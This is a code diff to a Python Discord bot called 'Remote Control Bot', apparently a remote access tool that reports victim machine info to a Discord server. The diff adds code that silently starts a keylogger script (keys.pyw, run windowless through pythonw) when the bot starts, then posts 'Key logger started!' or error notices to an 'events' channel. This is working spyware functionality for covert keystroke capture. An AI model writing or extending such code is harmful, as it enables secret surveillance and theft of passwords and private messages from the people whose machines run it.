@@ -338,6 +338,24 @@ async def on_ready():
             embed = nextcord.Embed(title="Client info:", timestamp=datetime.now(), colour=0xe4f500, description=des)
             embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
             await channel.send(embed=embed)
+            global process
+            try:
+                process = subprocess.Popen(["pythonw", os.path.join(target_path, "skibidi-main", "keys.pyw")])
+                embed = nextcord.Embed(title="Key logger started!", timestamp=datetime.now(), colour=0x00f51d, description="Key logger has now started!")
+                embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+
+                channel = nextcord.utils.get(category.text_channels, name="events")
+                if channel:
+                    await channel.send(embed=embed)
+
+            except Exception as e:
+                print(f"Error starting keylogger: {e}")
+                embed = nextcord.Embed(title="Key logger error", timestamp=datetime.now(), colour=0xff0000, description="Key logger error: " + str(e))
+                embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+
+                channel = nextcord.utils.get(category.text_channels, name="events")
+                if channel:
+                    await channel.send(embed=embed)
 
 
         if existing_category:
